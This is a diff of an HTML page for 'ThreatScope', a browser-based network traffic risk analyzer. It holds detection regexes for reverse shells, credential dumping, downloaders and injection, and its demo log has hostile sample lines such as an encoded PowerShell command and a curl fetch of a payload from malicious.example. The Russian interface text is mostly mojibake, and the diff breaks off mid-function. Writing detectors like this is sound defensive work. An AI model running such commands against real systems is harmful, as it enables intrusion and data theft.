@@ -1,382 +1,1048 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-
-<title>Network Traffic Risk Analyzer</title>
-
-<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-<script src="https://cdn.jsdelivr.net/npm/pcap-parser/dist/pcap-parser.min.js"></script>
-
-<style>
-
-body{
-margin:0;
-font-family:Arial, Helvetica, sans-serif;
-background:#0b0f14;
-color:#e8eef6;
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>ThreatScope | РђРЅР°Р»РёР· СЃРµС‚РµРІРѕРіРѕ С‚СЂР°С„РёРєР°</title>
+  <meta name="description" content="РџСЂРѕС‚РѕС‚РёРї РІРµР±-РёРЅС‚РµСЂС„РµР№СЃР° РґР»СЏ СЂР°РЅРЅРµРіРѕ РІС‹СЏРІР»РµРЅРёСЏ РєРёР±РµСЂСѓРіСЂРѕР· РїРѕ PCAP, CSV Рё С‚РµРєСЃС‚РѕРІС‹Рј РґР°С‚Р°СЃРµС‚Р°Рј.">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+  <style>
+:root {
+  --bg: #07111f;
+  --panel: rgba(10, 20, 38, 0.84);
+  --panel2: rgba(13, 26, 49, 0.95);
+  --line: rgba(133, 167, 255, 0.18);
+  --text: #edf4ff;
+  --muted: #97a9cd;
+  --accent: #5dd8ff;
+  --accent2: #7cffb7;
+  --warn: #ffb454;
+  --danger: #ff5d86;
+  --shadow: 0 22px 80px rgba(19, 45, 91, 0.45);
 }
 
-header{
-padding:18px;
-background:#0e141d;
-border-bottom:1px solid #1b2533;
-font-size:20px;
+* { box-sizing: border-box; }
+
+body {
+  margin: 0;
+  min-height: 100vh;
+  font-family: "Space Grotesk", sans-serif;
+  color: var(--text);
+  background:
+    radial-gradient(circle at top left, rgba(93, 216, 255, 0.14), transparent 34%),
+    radial-gradient(circle at 85% 10%, rgba(124, 255, 183, 0.08), transparent 26%),
+    linear-gradient(145deg, #040912 0%, #08111f 40%, #091527 100%);
 }
 
-main{
-max-width:1100px;
-margin:auto;
-padding:16px;
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  pointer-events: none;
+  background-image:
+    linear-gradient(rgba(255, 255, 255, 0.02) 1px, transparent 1px),
+    linear-gradient(90deg, rgba(255, 255, 255, 0.02) 1px, transparent 1px);
+  background-size: 48px 48px;
+  mask-image: linear-gradient(to bottom, rgba(0, 0, 0, 0.5), transparent 90%);
 }
 
-.card{
-background:#0e141d;
-border:1px solid #1b2533;
-border-radius:10px;
-padding:16px;
-margin-bottom:16px;
+.app {
+  width: min(1280px, calc(100% - 28px));
+  margin: 0 auto;
+  padding: 24px 0 52px;
 }
 
-input,button{
-background:#172235;
-color:#fff;
-border:1px solid #22314a;
-border-radius:6px;
-padding:8px 12px;
-cursor:pointer;
+.hero, .card {
+  border: 1px solid var(--line);
+  border-radius: 28px;
+  background: var(--panel);
+  backdrop-filter: blur(16px);
+  box-shadow: var(--shadow);
 }
 
-button:hover{
-background:#1d2f4a;
+.hero {
+  display: grid;
+  grid-template-columns: minmax(0, 1.3fr) minmax(280px, 0.85fr);
+  gap: 22px;
+  padding: 30px;
+  position: relative;
+  overflow: hidden;
 }
 
-.bar{
-height:12px;
-background:#1b2533;
-border-radius:10px;
-overflow:hidden;
-margin-top:8px;
+.hero::after {
+  content: "";
+  position: absolute;
+  right: -90px;
+  top: -70px;
+  width: 280px;
+  height: 280px;
+  border-radius: 50%;
+  background: radial-gradient(circle, rgba(93, 216, 255, 0.24), transparent 68%);
 }
 
-.bar div{
-height:12px;
-background:#2b6cb0;
-width:0%;
+.hero-copy, .hero-side, .stack, .metrics, .charts, .two-col, .grid {
+  display: grid;
+  gap: 18px;
 }
 
-pre{
-background:#0b0f14;
-border:1px solid #1b2533;
-border-radius:8px;
-padding:10px;
-max-height:260px;
-overflow:auto;
+.hero-copy { position: relative; z-index: 1; }
+.hero-copy h1 {
+  margin: 0;
+  font-size: clamp(2.4rem, 5vw, 4.3rem);
+  line-height: 0.98;
+  letter-spacing: -0.04em;
+  max-width: 11ch;
 }
 
-.grid{
-display:grid;
-grid-template-columns:1fr 1fr;
-gap:16px;
+.hero-copy p, .sub { margin: 0; color: var(--muted); line-height: 1.65; }
+.pills { display: flex; flex-wrap: wrap; gap: 10px; }
+
+.pill {
+  border: 1px solid var(--line);
+  border-radius: 999px;
+  padding: 8px 12px;
+  font-size: 0.88rem;
+  color: var(--muted);
+  background: rgba(255, 255, 255, 0.03);
 }
 
-@media(max-width:900px){
-.grid{grid-template-columns:1fr}
+.mono {
+  font-family: "IBM Plex Mono", monospace;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+}
+
+.hero-side {
+  position: relative;
+  z-index: 1;
+  padding: 20px;
+  border: 1px solid var(--line);
+  border-radius: 24px;
+  background: linear-gradient(180deg, rgba(11, 25, 47, 0.92), rgba(6, 14, 28, 0.92));
+}
+
+.ring {
+  width: 180px;
+  aspect-ratio: 1;
+  margin: 0 auto;
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+  position: relative;
+  background:
+    radial-gradient(circle at center, rgba(8, 17, 31, 0.94) 48%, transparent 49%),
+    conic-gradient(var(--danger), var(--warn), var(--accent2), var(--danger));
+  box-shadow: inset 0 0 0 12px rgba(9, 22, 41, 0.95);
+}
+
+.ring::before {
+  content: "";
+  position: absolute;
+  inset: 14px;
+  border-radius: 50%;
+  background: linear-gradient(180deg, rgba(6, 13, 26, 0.98), rgba(13, 26, 49, 0.94));
+  border: 1px solid rgba(255, 255, 255, 0.06);
+}
+
+.ring > div { position: relative; z-index: 1; text-align: center; }
+.ring strong {
+  display: block;
+  font-size: 3rem;
+  line-height: 1;
+  letter-spacing: -0.04em;
+}
+
+.top { grid-template-columns: minmax(0, 1.2fr) minmax(320px, 0.8fr); }
+.two-col { grid-template-columns: minmax(0, 1fr) minmax(320px, 0.9fr); }
+
+.card {
+  padding: 24px;
+  margin-top: 22px;
+}
+
+.head {
+  display: flex;
+  justify-content: space-between;
+  gap: 16px;
+  align-items: flex-start;
+  margin-bottom: 16px;
+}
+
+.head h2, .head h3 { margin: 0; }
+
+.drop {
+  position: relative;
+  border: 1px dashed rgba(133, 167, 255, 0.34);
+  border-radius: 24px;
+  padding: 26px;
+  background:
+    radial-gradient(circle at top right, rgba(93, 216, 255, 0.12), transparent 32%),
+    rgba(255, 255, 255, 0.02);
+  transition: 0.2s ease;
+}
+
+.drop.drag {
+  transform: translateY(-2px);
+  border-color: rgba(93, 216, 255, 0.72);
+}
+
+.drop input {
+  position: absolute;
+  inset: 0;
+  opacity: 0;
+  cursor: pointer;
+}
+
+.upload {
+  display: grid;
+  grid-template-columns: minmax(0, 1fr) auto;
+  gap: 18px;
+  align-items: center;
+}
+
+.actions, .lists { display: grid; gap: 12px; }
+.btns { display: flex; flex-wrap: wrap; gap: 12px; margin-top: 16px; }
+
+button {
+  border: 0;
+  border-radius: 16px;
+  padding: 14px 18px;
+  font: inherit;
+  font-weight: 700;
+  cursor: pointer;
+}
+
+.primary {
+  color: #06121f;
+  background: linear-gradient(135deg, var(--accent), var(--accent2));
+  box-shadow: 0 12px 26px rgba(93, 216, 255, 0.22);
+}
+
+.secondary {
+  color: var(--text);
+  background: rgba(255, 255, 255, 0.04);
+  border: 1px solid var(--line);
+}
+
+.metrics { grid-template-columns: repeat(4, minmax(0, 1fr)); }
+
+.metric, .info, .chart, .item {
+  border: 1px solid var(--line);
+  border-radius: 22px;
+  background: linear-gradient(180deg, rgba(255, 255, 255, 0.04), rgba(6, 14, 28, 0.5));
+}
+
+.metric { padding: 18px; min-height: 126px; }
+.metric span {
+  display: block;
+  color: var(--muted);
+  font-size: 0.88rem;
+  text-transform: uppercase;
+  letter-spacing: 0.08em;
+}
+
+.metric strong {
+  display: block;
+  margin: 10px 0;
+  font-size: clamp(1.6rem, 4vw, 2.3rem);
+  line-height: 1;
+  letter-spacing: -0.04em;
+}
+
+.metric small, .item span, .info p, .info li {
+  color: var(--muted);
+  line-height: 1.6;
+}
+
+.info { padding: 18px; }
+.info ul { margin: 0; padding-left: 18px; }
+.charts { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+.chart { padding: 18px; min-height: 310px; }
+.canvas { position: relative; min-height: 235px; }
+
+.preview {
+  border: 1px solid var(--line);
+  border-radius: 22px;
+  background: var(--panel2);
+  overflow: hidden;
+}
+
+.preview-head {
+  display: flex;
+  justify-content: space-between;
+  gap: 12px;
+  align-items: center;
+  padding: 16px 18px;
+  border-bottom: 1px solid var(--line);
+  background: rgba(255, 255, 255, 0.03);
+}
+
+pre {
+  margin: 0;
+  min-height: 320px;
+  max-height: 520px;
+  overflow: auto;
+  padding: 20px;
+  white-space: pre-wrap;
+  font-family: "IBM Plex Mono", monospace;
+  font-size: 0.9rem;
+  line-height: 1.6;
+  color: #d7e5ff;
+  background: linear-gradient(180deg, rgba(6, 14, 28, 0.85), rgba(6, 14, 28, 0.95));
+}
+
+.item { padding: 16px 18px; display: grid; gap: 6px; }
+.item small { color: var(--muted); font-family: "IBM Plex Mono", monospace; }
+
+.risk-low { color: var(--accent2); }
+.risk-medium { color: var(--warn); }
+.risk-high { color: var(--danger); }
+
+.foot {
+  margin-top: 20px;
+  text-align: center;
+  color: var(--muted);
+  font-size: 0.92rem;
+  line-height: 1.6;
+}
+
+@media (max-width: 1100px) {
+  .hero, .top, .two-col, .charts, .upload { grid-template-columns: 1fr; }
+  .metrics { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+}
+
+@media (max-width: 720px) {
+  .app { width: min(100% - 18px, 1280px); padding-top: 18px; }
+  .hero, .card { padding: 18px; }
+  .metrics { grid-template-columns: 1fr; }
+  .ring { width: 156px; }
+  pre { min-height: 240px; }
 }
 
 </style>
-
+  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.2/dist/chart.umd.min.js"></script>
 </head>
-
 <body>
+  <div class="app">
+    <section class="hero">
+      <div class="hero-copy">
+        <div class="pills">
+          <span class="pill mono">ThreatScope</span>
+          <span class="pill mono">Browser Analysis</span>
+          <span class="pill mono">PCAP / TXT / CSV</span>
+        </div>
+        <h1>Р Р°РЅРЅРµРµ РІС‹СЏРІР»РµРЅРёРµ СѓРіСЂРѕР· РІ СЃРµС‚РµРІРѕРј С‚СЂР°С„РёРєРµ</h1>
+        <p>Р—Р°РіСЂСѓР·РёС‚Рµ СЃРµС‚РµРІРѕР№ РґР°С‚Р°СЃРµС‚, Р° РёРЅС‚РµСЂС„РµР№СЃ Р»РѕРєР°Р»СЊРЅРѕ РѕРїСЂРµРґРµР»РёС‚ С‚РёРї С„Р°Р№Р»Р°, РІС‹РїРѕР»РЅРёС‚ Р±Р°Р·РѕРІС‹Р№ Р°РЅР°Р»РёР· Рё РїРѕРєР°Р¶РµС‚ Risk Score, IOC, СЃС‚Р°С‚РёСЃС‚РёРєСѓ Рё РіСЂР°С„РёРєРё Р±РµР· РѕС‚РїСЂР°РІРєРё РґР°РЅРЅС‹С… РЅР° СЃРµСЂРІРµСЂ.</p>
+        <div class="pills">
+          <span class="pill">РљР»Р°СЃСЃРёС‡РµСЃРєРёР№ PCAP</span>
+          <span class="pill">PCAPNG</span>
+          <span class="pill">CSV / TXT / LOG</span>
+          <span class="pill">IPv4 / IPv6 / TCP / UDP</span>
+        </div>
+      </div>
+      <aside class="hero-side">
+        <div class="ring"><div><strong id="heroRisk">0</strong><span class="sub">Risk Score</span></div></div>
+        <div class="stack">
+          <div>Р РµР¶РёРј: <strong id="mode">РћР¶РёРґР°РЅРёРµ Р·Р°РіСЂСѓР·РєРё</strong></div>
+          <div>Р”Р°С‚Р°СЃРµС‚: <strong id="datasetName">РќРµС‚ С„Р°Р№Р»Р°</strong></div>
+          <div class="sub">Р­РІСЂРёСЃС‚РёРєРё: С‚РѕРєРµРЅС‹, URL, РїРѕСЂС‚С‹ СЂРёСЃРєР°, С€РёСЂРѕРєРѕРІРµС‰Р°РЅРёРµ, РѕР±С…РѕРґ Р°РґСЂРµСЃРѕРІ Рё РїРѕСЂС‚РѕРІ.</div>
+        </div>
+      </aside>
+    </section>
 
-<header>
-Network Traffic Risk Analyzer
-</header>
+    <section class="card grid top">
+      <div>
+        <div class="head"><div><h2>Р—Р°РіСЂСѓР·РєР° РґР°С‚Р°СЃРµС‚Р°</h2><p class="sub">РџРµСЂРµС‚Р°С‰РёС‚Рµ С„Р°Р№Р» РёР»Рё РІС‹Р±РµСЂРёС‚Рµ РµРіРѕ РІСЂСѓС‡РЅСѓСЋ. РђРЅР°Р»РёР· Р·Р°РїСѓСЃРєР°РµС‚СЃСЏ СЃСЂР°Р·Сѓ РїРѕСЃР»Рµ С‡С‚РµРЅРёСЏ РІ Р±СЂР°СѓР·РµСЂРµ.</p></div></div>
+        <label class="drop" id="dropZone">
+          <input id="fileInput" type="file" accept=".pcap,.pcapng,.csv,.txt,.log,.json,.tsv">
+          <div class="upload">
+            <div>
+              <h2>РРјРїРѕСЂС‚ СЃРµС‚РµРІС‹С… РґР°РЅРЅС‹С…</h2>
+              <p class="sub">РџРѕРґРґРµСЂР¶РёРІР°СЋС‚СЃСЏ PCAP, PCAPNG, Р¶СѓСЂРЅР°Р»С‹, CSV Рё РґСЂСѓРіРёРµ С‚РµРєСЃС‚РѕРІС‹Рµ С„Р°Р№Р»С‹. РџРѕСЃР»Рµ Р·Р°РіСЂСѓР·РєРё СЃРёСЃС‚РµРјР° Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РІС‹Р±РёСЂР°РµС‚ СЃРѕРѕС‚РІРµС‚СЃС‚РІСѓСЋС‰РёР№ Р°Р»РіРѕСЂРёС‚Рј Р°РЅР°Р»РёР·Р°.</p>
+              <div class="btns">
+                <button type="button" class="primary" id="pickBtn">Р’С‹Р±СЂР°С‚СЊ С„Р°Р№Р»</button>
+                <button type="button" class="secondary" id="demoBtn">Р”РµРјРѕ-СЃС†РµРЅР°СЂРёР№</button>
+              </div>
+            </div>
+            <div class="actions">
+              <div class="pill">Р›РѕРєР°Р»СЊРЅР°СЏ РѕР±СЂР°Р±РѕС‚РєР°</div>
+              <div class="pill">Р‘РµР· backend API</div>
+              <div class="pill">РђРІС‚РѕРѕРїСЂРµРґРµР»РµРЅРёРµ С„РѕСЂРјР°С‚Р°</div>
+            </div>
+          </div>
+        </label>
+      </div>
+      <div>
+        <div class="head"><div><h2>РћРїРµСЂР°С‚РёРІРЅС‹Р№ СЃС‚Р°С‚СѓСЃ</h2><p class="sub">РЎРІРѕРґРєР° РїРѕ С‚РµРєСѓС‰РµРјСѓ РЅР°Р±РѕСЂСѓ РґР°РЅРЅС‹С… Рё Р°РєС‚РёРІРЅС‹Рј РґРµС‚РµРєС‚РѕСЂР°Рј.</p></div></div>
+        <div class="actions">
+          <div class="info"><strong id="statusTitle">РЎРёСЃС‚РµРјР° РіРѕС‚РѕРІР° Рє Р°РЅР°Р»РёР·Сѓ</strong><p id="statusText">Р—Р°РіСЂСѓР·РёС‚Рµ С„Р°Р№Р», С‡С‚РѕР±С‹ РїРѕР»СѓС‡РёС‚СЊ РїРѕРєР°Р·Р°С‚РµР»Рё, РёРЅРґРёРєР°С‚РѕСЂС‹, РіСЂР°С„РёРєРё Рё РїСЂРµРґРІР°СЂРёС‚РµР»СЊРЅС‹Р№ РїСЂРѕСЃРјРѕС‚СЂ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ.</p></div>
+          <div class="info"><strong>РђРєС‚РёРІРЅС‹Рµ РґРµС‚РµРєС‚РѕСЂС‹</strong><ul><li>РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Рµ С‚РѕРєРµРЅС‹, URL, РєРѕРјР°РЅРґС‹ Рё IOC РІ С‚РµРєСЃС‚РѕРІС‹С… РёСЃС‚РѕС‡РЅРёРєР°С…</li><li>РџРѕСЂС‚С‹ РїРѕРІС‹С€РµРЅРЅРѕРіРѕ СЂРёСЃРєР° Рё С‡Р°СЃС‚РѕС‚РЅС‹Рµ Р°РЅРѕРјР°Р»РёРё РІ С‚СЂР°С„РёРєРµ</li><li>РЎРєР°РЅРёСЂРѕРІР°РЅРёРµ РїРѕ Р°РґСЂРµСЃР°Рј Рё РїРѕСЂС‚Р°Рј, РґРѕРјРёРЅРёСЂСѓСЋС‰РёРµ СѓР·Р»С‹</li></ul></div>
+        </div>
+      </div>
+    </section>
 
-<main>
+    <section class="card">
+      <div class="head"><div><h2>РљР»СЋС‡РµРІС‹Рµ РїРѕРєР°Р·Р°С‚РµР»Рё Р°РЅР°Р»РёР·Р°</h2><p class="sub">Р РёСЃРє Рё СЃС‚Р°С‚РёСЃС‚РёРєР° РѕР±РЅРѕРІР»СЏСЋС‚СЃСЏ РїРѕСЃР»Рµ РєР°Р¶РґРѕРіРѕ Р·Р°РїСѓСЃРєР°.</p></div></div>
+      <div class="metrics">
+        <article class="metric"><span>Risk Score</span><strong id="riskValue">0</strong><small id="riskText">РћР¶РёРґР°РЅРёРµ РґР°РЅРЅС‹С…</small></article>
+        <article class="metric"><span>Р Р°Р·РјРµСЂ РґР°С‚Р°СЃРµС‚Р°</span><strong id="sizeValue">0 B</strong><small id="typeText">РўРёРї РЅРµ РѕРїСЂРµРґРµР»С‘РЅ</small></article>
+        <article class="metric"><span>РЎС‚СЂРѕРєРё / РџР°РєРµС‚С‹</span><strong id="recordsValue">0</strong><small id="recordsText">РќРµС‚ РѕР±СЂР°Р±РѕС‚Р°РЅРЅС‹С… Р·Р°РїРёСЃРµР№</small></article>
+        <article class="metric"><span>РџРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Рµ СЃРѕРІРїР°РґРµРЅРёСЏ</span><strong id="matchesValue">0</strong><small id="matchesText">IOC РїРѕРєР° РЅРµ РѕР±РЅР°СЂСѓР¶РµРЅС‹</small></article>
+      </div>
+    </section>
 
-<div class="card">
+    <section class="card two-col">
+      <div>
+        <div class="head"><div><h2>Р’РёР·СѓР°Р»РёР·Р°С†РёСЏ СЂРµР·СѓР»СЊС‚Р°С‚Р°</h2><p class="sub">Р”Р»СЏ С‚РµРєСЃС‚Р° РїРѕРєР°Р·С‹РІР°РµС‚СЃСЏ СЂР°СЃРїСЂРµРґРµР»РµРЅРёРµ С‚РѕРєРµРЅРѕРІ, РґР»СЏ С‚СЂР°С„РёРєР° СЃСЂРµР· РїРѕ РёРЅРґРёРєР°С‚РѕСЂР°Рј Рё РґРѕР»СЏ РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅРѕРіРѕ С‚СЂР°С„РёРєР°.</p></div></div>
+        <div class="charts">
+          <div class="chart"><h3 id="barTitle">Р Р°СЃРїСЂРµРґРµР»РµРЅРёРµ РёРЅРґРёРєР°С‚РѕСЂРѕРІ</h3><div class="canvas"><canvas id="barChart"></canvas></div></div>
+          <div class="chart"><h3 id="doughnutTitle">РќРѕСЂРјР°Р»СЊРЅС‹Р№ Рё РїРѕРґРѕР·СЂРёС‚РµР»СЊРЅС‹Р№ С‚СЂР°С„РёРє</h3><div class="canvas"><canvas id="doughnutChart"></canvas></div></div>
+        </div>
+      </div>
+      <div>
+        <div class="head"><div><h2>РРЅРґРёРєР°С‚РѕСЂС‹ Рё РїСЂРѕС„РёР»СЊ С‚СЂР°С„РёРєР°</h2><p class="sub">РЎРїРёСЃРѕРє IOC Рё РєСЂР°С‚РєР°СЏ Р°РЅР°Р»РёС‚РёРєР° РїРѕ Р°РґСЂРµСЃР°Рј, РїРѕСЂС‚Р°Рј Рё Р°РєС‚РёРІРЅРѕСЃС‚Рё.</p></div></div>
+        <div class="lists" id="indicatorList"></div>
+        <div class="head"><div><h3>РџСЂРѕС„РёР»СЊ</h3></div></div>
+        <div class="lists" id="networkList"></div>
+      </div>
+    </section>
 
-<b>Загрузка датасета</b>
-<br><br>
+    <section class="card">
+      <div class="head"><div><h2>РџСЂРµРґРІР°СЂРёС‚РµР»СЊРЅС‹Р№ РїСЂРѕСЃРјРѕС‚СЂ РґР°РЅРЅС‹С…</h2><p class="sub">Р”Р»СЏ С‚РµРєСЃС‚РѕРІС‹С… С„Р°Р№Р»РѕРІ РїРѕРєР°Р·С‹РІР°РµС‚СЃСЏ С„СЂР°РіРјРµРЅС‚ СЃРѕРґРµСЂР¶РёРјРѕРіРѕ, РґР»СЏ PCAP вЂ” Р¶СѓСЂРЅР°Р» СЂР°Р·Р±РѕСЂР° РїР°РєРµС‚РѕРІ Рё СЃРµС‚РµРІС‹С… СЃСѓС‰РЅРѕСЃС‚РµР№.</p></div></div>
+      <div class="preview">
+        <div class="preview-head"><strong id="previewName" class="mono">dataset-preview.log</strong><span class="pill" id="previewType">РќРµС‚ Р°РєС‚РёРІРЅРѕРіРѕ РёСЃС‚РѕС‡РЅРёРєР°</span></div>
+        <pre id="previewText">РћР¶РёРґР°РЅРёРµ С„Р°Р№Р»Р°. Р—Р°РіСЂСѓР·РёС‚Рµ PCAP, PCAPNG, CSV, TXT РёР»Рё LOG РґР»СЏ Р·Р°РїСѓСЃРєР° Р°РЅР°Р»РёР·Р°.</pre>
+      </div>
+    </section>
 
-<input type="file" id="file">
-<button onclick="clearUI()">Очистить</button>
+    <p class="foot">РРЅС‚РµСЂС„РµР№СЃ РїСЂРµРґРЅР°Р·РЅР°С‡РµРЅ РґР»СЏ РїРµСЂРІРёС‡РЅРѕРіРѕ Р±СЂР°СѓР·РµСЂРЅРѕРіРѕ Р°РЅР°Р»РёР·Р° Рё Р±С‹СЃС‚СЂРѕР№ РІРёР·СѓР°Р»СЊРЅРѕР№ РѕС†РµРЅРєРё СѓРіСЂРѕР·. Р РµР·СѓР»СЊС‚Р°С‚С‹ РЅРѕСЃСЏС‚ СЌРІСЂРёСЃС‚РёС‡РµСЃРєРёР№ С…Р°СЂР°РєС‚РµСЂ Рё РЅРµ Р·Р°РјРµРЅСЏСЋС‚ РіР»СѓР±РѕРєРёР№ С„РѕСЂРµРЅР·РёРє РёР»Рё IDS/IPS.</p>
+  </div>
+  <script>
+const $ = (id) => document.getElementById(id);
 
-</div>
+const ui = {
+  file: $("fileInput"),
+  pick: $("pickBtn"),
+  demo: $("demoBtn"),
+  drop: $("dropZone"),
+  heroRisk: $("heroRisk"),
+  mode: $("mode"),
+  dataset: $("datasetName"),
+  statusTitle: $("statusTitle"),
+  statusText: $("statusText"),
+  risk: $("riskValue"),
+  riskText: $("riskText"),
+  size: $("sizeValue"),
+  type: $("typeText"),
+  records: $("recordsValue"),
+  recordsText: $("recordsText"),
+  matches: $("matchesValue"),
+  matchesText: $("matchesText"),
+  previewName: $("previewName"),
+  previewType: $("previewType"),
+  preview: $("previewText"),
+  indicatorList: $("indicatorList"),
+  networkList: $("networkList"),
+  barTitle: $("barTitle"),
+  doughnutTitle: $("doughnutTitle")
+};
 
-<div class="card">
+const charts = { bar: null, doughnut: null };
 
-<b>Risk Score</b>
+const textPatterns = [
+  { label: "Encoded PowerShell", regex: /-enc(?:odedcommand)?\b|powershell.+frombase64string/i, severity: 12 },
+  { label: "Credential Dumping", regex: /\bmimikatz\b|sekurlsa|lsass/i, severity: 14 },
+  { label: "Remote Shell", regex: /\b(?:nc|netcat)\b.*\s-e\b|\/bin\/sh|cmd\.exe/i, severity: 11 },
+  { label: "Downloader Activity", regex: /\b(?:curl|wget|bitsadmin|certutil)\b/i, severity: 8 },
+  { label: "Recon Command", regex: /\b(?:nmap|masscan|whoami|ipconfig|net user|arp -a)\b/i, severity: 7 },
+  { label: "Suspicious URL", regex: /https?:\/\/[^\s]+/i, severity: 5 },
+  { label: "Persistence Signal", regex: /\b(?:schtasks|cron|reg add|startup)\b/i, severity: 9 },
+  { label: "Script Injection", regex: /<script\b|eval\(|document\.cookie|onerror=/i, severity: 7 },
+  { label: "SQL Injection", regex: /union\s+select|drop\s+table|or\s+1=1/i, severity: 8 },
+  { label: "Long Base64 Blob", regex: /\b[A-Za-z0-9+/]{40,}={0,2}\b/, severity: 6 }
+];
 
-<div class="bar">
-<div id="riskBar"></div>
-</div>
+const riskyPorts = new Map([
+  [21, "FTP"], [22, "SSH"], [23, "Telnet"], [25, "SMTP"], [53, "DNS"],
+  [135, "RPC"], [139, "NetBIOS"], [445, "SMB"], [1433, "MSSQL"], [3306, "MySQL"],
+  [3389, "RDP"], [4444, "Metasploit"], [5555, "ADB"], [5900, "VNC"], [6667, "IRC"],
+  [8080, "Proxy"], [31337, "Backdoor"]
+]);
 
-<div id="riskText">—</div>
+ui.pick.addEventListener("click", () => ui.file.click());
+ui.file.addEventListener("change", (e) => {
+  const file = e.target.files?.[0];
+  if (file) handleFile(file);
+});
 
-</div>
+["dragenter", "dragover"].forEach((name) => {
+  ui.drop.addEventListener(name, (e) => {
+    e.preventDefault();
+    ui.drop.classList.add("drag");
+  });
+});
 
-<div class="grid">
+["dragleave", "dragend", "drop"].forEach((name) => {
+  ui.drop.addEventListener(name, (e) => {
+    e.preventDefault();
+    ui.drop.classList.remove("drag");
+  });
+});
 
-<div class="card">
+ui.drop.addEventListener("drop", (e) => {
+  const file = e.dataTransfer.files?.[0];
+  if (file) handleFile(file);
+});
 
-<b>Информация о датасете</b>
+ui.demo.addEventListener("click", () => {
+  const sample = [
+    "2026-03-11T11:21:02Z user=guest cmd=powershell -enc SQBmACgAJABlAG4AdgApAA==",
+    "2026-03-11T11:21:11Z src=10.10.4.12 dst=185.220.101.4 action=curl http://malicious.example/payload.exe",
+    "2026-03-11T11:21:27Z process=cmd.exe /c whoami && net user",
+    "2026-03-11T11:21:40Z alert=lateral movement smb://10.10.4.44/share",
+    "2026-03-11T11:21:58Z sql=SELECT * FROM users WHERE name='' OR 1=1 --",
+    "2026-03-11T11:22:05Z task=schtasks /create /sc minute /tn updater"
+  ].join("\n");
+  handleFile(new File([sample], "demo-threat-log.txt", { type: "text/plain" }));
+});
 
-<div id="info">
-Файл не загружен
-</div>
-
-</div>
-
-<div class="card">
-
-<b>Подозрительные токены</b>
-
-<div id="tokens">
-—
-</div>
-
-</div>
-
-</div>
-
-<div class="grid">
-
-<div class="card">
-
-<b>Частота подозрительных токенов</b>
-
-<canvas id="chart1"></canvas>
-
-</div>
-
-<div class="card">
-
-<b>Нормальный / подозрительный трафик</b>
-
-<canvas id="chart2"></canvas>
-
-</div>
-
-</div>
-
-<div class="card">
-
-<b>Превью данных</b>
-
-<pre id="preview"></pre>
-
-</div>
-
-</main>
-
-<script>
-
-const fileInput = document.getElementById("file")
-
-const preview = document.getElementById("preview")
-
-const info = document.getElementById("info")
-
-const tokensBox = document.getElementById("tokens")
-
-const riskBar = document.getElementById("riskBar")
-
-const riskText = document.getElementById("riskText")
-
-let chart1 = null
-let chart2 = null
-
-fileInput.addEventListener("change",function(e){
-
-const file = e.target.files[0]
-
-if(!file) return
-
-const reader = new FileReader()
-
-reader.onload = function(){
-
-const buffer = reader.result
-
-const text = new TextDecoder().decode(buffer)
-
-const lines = text.split(/\\r?\\n/).slice(0,8000)
-
-preview.textContent = lines.slice(0,80).join("\\n")
-
-analyzeText(lines)
-
-try{
-analyzePCAP(buffer)
-}catch(e){
-console.log("PCAP parse skipped")
+async function handleFile(file) {
+  try {
+    setLoading(file.name);
+    const buffer = await file.arrayBuffer();
+    const type = detectType(file, buffer);
+    const result = type.kind === "pcap"
+      ? analyzeCapture(buffer, file, type.variant)
+      : analyzeText(new TextDecoder("utf-8", { fatal: false }).decode(buffer), file, type.kind);
+    updateUI(result);
+  } catch (error) {
+    renderError(error instanceof Error ? error.message : "РќРµ СѓРґР°Р»РѕСЃСЊ РѕР±СЂР°Р±РѕС‚Р°С‚СЊ С„Р°Р№Р».");
+  }
 }
 
+function setLoading(name) {
+  ui.mode.textContent = "РРґС‘С‚ Р°РЅР°Р»РёР·";
+  ui.dataset.textContent = name;
+  ui.statusTitle.textContent = "Р’С‹РїРѕР»РЅСЏРµС‚СЃСЏ С‡С‚РµРЅРёРµ Рё Р°РЅР°Р»РёР· РґР°РЅРЅС‹С…";
+  ui.statusText.textContent = "РЎРёСЃС‚РµРјР° РѕРїСЂРµРґРµР»СЏРµС‚ С„РѕСЂРјР°С‚ С„Р°Р№Р»Р°, СЃС‚СЂРѕРёС‚ СЃС‚Р°С‚РёСЃС‚РёРєСѓ Рё РїРѕРґРіРѕС‚Р°РІР»РёРІР°РµС‚ РІРёР·СѓР°Р»РёР·Р°С†РёСЋ.";
+  ui.previewName.textContent = name;
+  ui.previewType.textContent = "РђРЅР°Р»РёР·";
+  ui.preview.textContent = "РРґС‘С‚ РїРѕРґРіРѕС‚РѕРІРєР° СЂРµР·СѓР»СЊС‚Р°С‚Р°...";
 }
 
-reader.readAsArrayBuffer(file)
-
-})
-
-function analyzeText(lines){
-
-const tokens = [
-
-"password",
-"token",
-"select",
-"drop",
-"<script",
-"cmd.exe",
-"powershell",
-"scan",
-"nmap",
-"sqlmap",
-"attack"
-
-]
-
-let suspicious = 0
-let tokenHits = {}
-
-for(let l of lines){
-
-let s = l.toLowerCase()
-
-for(let t of tokens){
-
-if(s.includes(t)){
-
-suspicious++
-
-tokenHits[t] = (tokenHits[t]||0)+1
-
+function detectType(file, buffer) {
+  const ext = file.name.toLowerCase().split(".").pop() || "";
+  const sig = [...new Uint8Array(buffer.slice(0, 4))].map((v) => v.toString(16).padStart(2, "0")).join("");
